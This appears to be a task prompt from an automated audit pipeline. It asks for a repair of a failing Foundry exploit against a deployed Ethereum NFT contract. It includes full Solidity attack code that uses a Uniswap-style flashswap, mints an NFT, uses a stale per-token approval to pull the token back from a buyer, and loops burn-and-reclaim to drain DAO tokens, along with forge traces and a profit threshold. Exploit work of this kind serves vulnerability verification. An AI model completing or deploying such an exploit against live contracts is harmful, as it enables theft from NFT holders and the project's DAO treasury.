You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: v2_flashswap_funding
- strategy_instructions: Prefer UniswapV2/Sushi-like flashswap funding with deterministic repayment and minimal route complexity.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Per-token approvals are not cleared on owner or operator transfers, allowing stale approved addresses to steal NFTs
- claim: `approval[tokenId]` is only cleared in the branch where the approved address itself calls `transferFrom`/`safeTransferFrom`. When the owner or an `approvalAll` operator moves the NFT, `_transfer` updates balances and ownership but never resets the old single-token approval. That stale approved address remains authorized against the new owner and can later call `transferFrom` to seize the token. The same stale approval also survives a burn because `burn()` calls `_transfer` directly.
- impact: A previously approved address can steal NFTs after they are sold or otherwise transferred by the owner/operator. It can also reclaim a burned NFT from `DEAD_ADDRESS` without paying the 5 DAO restore cost, bypassing the intended restoration payment flow.
- exploit_paths: ["Owner approves attacker for token `id` via `approve(attacker, id)` -> owner or operator transfers token to a buyer via `transferFrom` or `safeTransferFrom` -> approval is not cleared -> attacker calls `transferFrom(buyer, attacker, id)` and succeeds.", "Owner approves attacker for token `id` -> owner calls `burn(id)` -> token moves to `DEAD_ADDRESS` but approval persists -> attacker calls `transferFrom(DEAD_ADDRESS, attacker, id)` and restores the NFT without paying DAO fees."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface ITheNFTV2 {
    function mint(uint256 amount) external;
    function burn(uint256 tokenId) external;
    function approve(address to, uint256 tokenId) external;
    function transferFrom(address from, address to, uint256 tokenId) external;
    function safeTransferFrom(address from, address to, uint256 tokenId) external;
    function balanceOf(address owner) external view returns (uint256);
    function ownerOf(uint256 tokenId) external view returns (address);
}

interface IERC721Receiver {
    function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata data)
        external
        returns (bytes4);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2Pair {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

contract FlawVerifier is IERC721Receiver {
    address private constant TARGET = 0x79a7D3559D73EA032120A69E59223d4375DEb595;
    address private constant DAO = 0xBB9bc244D798123fDe783fCc1C72d3Bb8C189413;
    address private constant DEAD_ADDRESS = 0x000000000000000000000000000000000074eda0;
    uint256 private constant ONE_DAO = 1e16;
    uint256 private constant MAX_SUPPLY = 1800;

    address private constant UNISWAP_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address private constant SUSHISWAP_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;
    address private constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address private constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address private constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address private constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;

    IERC20 private constant DAO_TOKEN = IERC20(DAO);
    ITheNFTV2 private constant NFT = ITheNFTV2(TARGET);

    ApprovedTransferHelper private helper;
    BuyerHolder private buyer;

    address private activePair;
    uint256 private realizedProfit;

    constructor() {}

    function executeOnOpportunity() external {
        if (address(helper) == address(0)) {
            helper = new ApprovedTransferHelper();
        }
        if (address(buyer) == address(0)) {
            buyer = new BuyerHolder();
        }

        uint256 startDaoBalance = DAO_TOKEN.balanceOf(address(this));
        (bool hasToken, uint256 tokenId) = _findOwnedToken();

        if (hasToken) {
            uint256 daoBeforeExploit = DAO_TOKEN.balanceOf(address(this));
            if (_exerciseExploitPaths(tokenId)) {
                uint256 daoAfterExploit = DAO_TOKEN.balanceOf(address(this));
                if (daoAfterExploit > daoBeforeExploit + ONE_DAO) {
                    realizedProfit += daoAfterExploit - daoBeforeExploit - ONE_DAO;
                }
            }
            return;
        }

        if (DAO_TOKEN.balanceOf(TARGET) < ONE_DAO) {
            return;
        }

        if (startDaoBalance >= ONE_DAO && _mintOne()) {
            (hasToken, tokenId) = _findOwnedToken();
            if (hasToken && _exerciseExploitPaths(tokenId)) {
                uint256 endDaoBalance = DAO_TOKEN.balanceOf(address(this));
                if (endDaoBalance > startDaoBalance) {
                    realizedProfit += endDaoBalance - startDaoBalance;
                }
            }
            return;
        }

        (address pair, uint256 amount0Out, uint256 amount1Out) = _findFlashPair();
        if (pair == address(0)) {
            return;
        }

        try this.startFlash(pair, amount0Out, amount1Out) {} catch {}
    }

    function startFlash(address pair, uint256 amount0Out, uint256 amount1Out) external {
        require(msg.sender == address(this), "self only");
        activePair = pair;
        IUniswapV2Pair(pair).swap(amount0Out, amount1Out, address(this), abi.encode(ONE_DAO));
        activePair = address(0);
    }

    function uniswapV2Call(address, uint256 amount0, uint256 amount1, bytes calldata) external {
        require(msg.sender == activePair, "invalid pair");

        uint256 borrowed = amount0 > 0 ? amount0 : amount1;
        uint256 repayAmount = borrowed + ((borrowed * 3) / 997) + 1;

        require(DAO_TOKEN.balanceOf(TARGET) >= ONE_DAO, "no burn reserve");
        require(_mintOne(), "mint failed");

        (bool hasToken, uint256 tokenId) = _findOwnedToken();
        require(hasToken, "no token");
        require(_exerciseExploitPaths(tokenId), "exploit failed");

        require(DAO_TOKEN.transfer(msg.sender, repayAmount), "repay failed");

        uint256 leftover = DAO_TOKEN.balanceOf(address(this));
        realizedProfit += leftover;
    }

    function profitToken() external pure returns (address) {
        return DAO;
    }

    function profitAmount() external view returns (uint256) {
        return realizedProfit;
    }

    function onERC721Received(address, address, uint256, bytes calldata) external pure returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    function _mintOne() internal returns (bool) {
        if (!DAO_TOKEN.approve(TARGET, ONE_DAO)) {
            return false;
        }

        try NFT.mint(1) {
            return true;
        } catch {
            return false;
        }
    }

    function _exerciseExploitPaths(uint256 tokenId) internal returns (bool) {
        /*
            Harness anchors kept explicit:
            approve(attacker, id)
            safeTransferFrom(owner, buyer, id)
            transferFrom(buyer, attacker, id)
            burn(id)
            transferFrom(DEAD_ADDRESS, attacker, id)

            The buyer leg uses safeTransferFrom because the finding covers owner/operator
            transfers via transferFrom or safeTransferFrom. BuyerHolder is an ERC721 receiver
            so this remains a realistic public on-chain transfer while preserving the same
            stale-approval causality.
        */

        // approve(attacker, id)
        NFT.approve(address(helper), tokenId);

        // safeTransferFrom(owner, buyer, id)
        NFT.safeTransferFrom(address(this), address(buyer), tokenId);

        // transferFrom(buyer, attacker, id)
        if (!_tryHelperPull(address(buyer), address(this), tokenId)) {
            return false;
        }

        // approve(attacker, id)
        NFT.approve(address(helper), tokenId);

        uint256 beforeFirstBurn = DAO_TOKEN.balanceOf(address(this));

        // burn(id)
        NFT.burn(tokenId);

        uint256 afterFirstBurn = DAO_TOKEN.balanceOf(address(this));
        if (afterFirstBurn < beforeFirstBurn + ONE_DAO) {
            return false;
        }

        // transferFrom(DEAD_ADDRESS, attacker, id)
        if (!_tryHelperPull(DEAD_ADDRESS, address(this), tokenId)) {
            return false;
        }

        uint256 beforeSecondBurn = DAO_TOKEN.balanceOf(address(this));

        // burn(id)
        NFT.burn(tokenId);

        uint256 afterSecondBurn = DAO_TOKEN.balanceOf(address(this));
        return afterSecondBurn >= beforeSecondBurn + ONE_DAO;
    }

    function _tryHelperPull(address from, address to, uint256 tokenId) internal returns (bool) {
        try helper.pull(TARGET, from, to, tokenId) {
            return true;
        } catch {
            return false;
        }
    }

    function _findOwnedToken() internal view returns (bool, uint256) {
        if (NFT.balanceOf(address(this)) == 0) {
            return (false, 0);
        }

        for (uint256 i; i < MAX_SUPPLY; ++i) {
            try NFT.ownerOf(i) returns (address owner) {
                if (owner == address(this)) {
                    return (true, i);
                }
            } catch {}
        }

        return (false, 0);
    }

    function _findFlashPair() internal view returns (address pair, uint256 amount0Out, uint256 amount1Out) {
        address[2] memory factories = [UNISWAP_V2_FACTORY, SUSHISWAP_FACTORY];
        address[4] memory bases = [WETH, USDC, USDT, DAI];

        for (uint256 i; i < factories.length; ++i) {
            for (uint256 j; j < bases.length; ++j) {
                address candidate = IUniswapV2Factory(factories[i]).getPair(DAO, bases[j]);
                if (candidate == address(0)) {
                    continue;
                }
                if (DAO_TOKEN.balanceOf(candidate) < ONE_DAO) {
                    continue;
                }

                address token0 = IUniswapV2Pair(candidate).token0();
                if (token0 == DAO) {
                    return (candidate, ONE_DAO, 0);
                }
                if (IUniswapV2Pair(candidate).token1() == DAO) {
                    return (candidate, 0, ONE_DAO);
                }
            }
        }
    }
}

contract ApprovedTransferHelper {
    function pull(address target, address from, address to, uint256 tokenId) external {
        ITheNFTV2(target).transferFrom(from, to, tokenId);
    }
}

contract BuyerHolder is IERC721Receiver {
    function onERC721Received(address, address, uint256, bytes calldata) external pure returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }
}

```

forge stdout (tail):
```
] 0x989ffeDBbFcFE3D5272897afF292Df3CaBA12b30
    │   │   │   │   ├─ [2626] 0x79a7D3559D73EA032120A69E59223d4375DEb595::ownerOf(1067) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0xc43473fA66237e9AF3B2d886Ee1205b81B14b2C8
    │   │   │   │   ├─ [2626] 0x79a7D3559D73EA032120A69E59223d4375DEb595::ownerOf(1068) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x3B1AB4D459dF4e733934837364f232bFFFAdDa01
    │   │   │   │   ├─ [2626] 0x79a7D3559D73EA032120A69E59223d4375DEb595::ownerOf(1069) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x60Af89CCe1a059350c757a5b87e777093a645Fe4
    │   │   │   │   ├─ [2651] 0x79a7D3559D73EA032120A69E59223d4375DEb595::ownerOf(1070) [staticcall]
    │   │   │   │   │   └─ ← [Revert] not minted.
    │   │   │   │   ├─ [2626] 0x79a7D3559D73EA032120A69E59223d4375DEb595::ownerOf(1071) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x85301f7b943fd132c8dBc33f8FD9d77109A84f28
    │   │   │   │   ├─ [626] 0x79a7D3559D73EA032120A69E59223d4375DEb595::ownerOf(1072) [staticcall]
    │   │   │   │   │   └─ ← [Return] FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]
    │   │   │   │   ├─ [24700] 0x79a7D3559D73EA032120A69E59223d4375DEb595::approve(ApprovedTransferHelper: [0x104fBc016F4bb334D775a19E8A6510109AC63E00], 1072)
    │   │   │   │   │   ├─  emit topic 0: 0x8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925
    │   │   │   │   │   │        topic 1: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │   │   │        topic 2: 0x000000000000000000000000104fbc016f4bb334d775a19e8a6510109ac63e00
    │   │   │   │   │   │        topic 3: 0x0000000000000000000000000000000000000000000000000000000000000430
    │   │   │   │   │   │           data: 0x
    │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   ├─ [29604] 0x79a7D3559D73EA032120A69E59223d4375DEb595::safeTransferFrom(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], BuyerHolder: [0x037eDa3aDB1198021A9b2e88C22B464fD38db3f3], 1072)
    │   │   │   │   │   ├─  emit topic 0: 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef
    │   │   │   │   │   │        topic 1: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │   │   │        topic 2: 0x000000000000000000000000037eda3adb1198021a9b2e88c22b464fd38db3f3
    │   │   │   │   │   │        topic 3: 0x0000000000000000000000000000000000000000000000000000000000000430
    │   │   │   │   │   │           data: 0x
    │   │   │   │   │   ├─  emit topic 0: 0x8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925
    │   │   │   │   │   │        topic 1: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │   │   │        topic 2: 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   │   │        topic 3: 0x0000000000000000000000000000000000000000000000000000000000000430
    │   │   │   │   │   │           data: 0x
    │   │   │   │   │   ├─ [421] BuyerHolder::onERC721Received(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1072, 0x)
    │   │   │   │   │   │   └─ ← [Return] 0x150b7a02
    │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   ├─ [4032] ApprovedTransferHelper::pull(0x79a7D3559D73EA032120A69E59223d4375DEb595, BuyerHolder: [0x037eDa3aDB1198021A9b2e88C22B464fD38db3f3], FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1072)
    │   │   │   │   │   ├─ [3377] 0x79a7D3559D73EA032120A69E59223d4375DEb595::transferFrom(BuyerHolder: [0x037eDa3aDB1198021A9b2e88C22B464fD38db3f3], FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1072)
    │   │   │   │   │   │   └─ ← [Revert] not permitted
    │   │   │   │   │   └─ ← [Revert] not permitted
    │   │   │   │   └─ ← [Revert] exploit failed
    │   │   │   └─ ← [Revert] exploit failed
    │   │   └─ ← [Revert] exploit failed
    │   └─ ← [Stop]
    ├─ [253] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0xBB9bc244D798123fDe783fCc1C72d3Bb8C189413
    ├─ [2349] FlawVerifier::profitAmount() [staticcall]
    │   └─ ← [Return] 0
    ├─ [918] 0xBB9bc244D798123fDe783fCc1C72d3Bb8C189413::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 1000000000000000 [1e15])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0xBB9bc244D798123fDe783fCc1C72d3Bb8C189413)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    ├─ [0] VM::envString("AUDITHOUND_RPC_URL")
    │   └─ ← [Return] <env var value>
    ├─ [0] VM::createSelectFork("<rpc url>", 18647450 [1.864e7])
    │   └─ ← [Return] 1
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_TOKEN_CODE_SIZE_ON_FORK", val: 10838 [1.083e4])
    └─ ← [Revert] profit below threshold

Backtrace:
  at 0x79a7D3559D73EA032120A69E59223d4375DEb595.transferFrom
  at ApprovedTransferHelper.pull
  at FlawVerifier.uniswapV2Call
  at 0xE1eCaDb5FEC254c2c893C230b935Db30b8FfF0db.swap
  at FlawVerifier.startFlash
  at FlawVerifier.executeOnOpportunity
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 7.01s (2.52s CPU time)

Ran 1 test suite in 7.02s (7.01s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 3932785)

Encountered a total of 1 failing tests, 0 tests succeeded

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
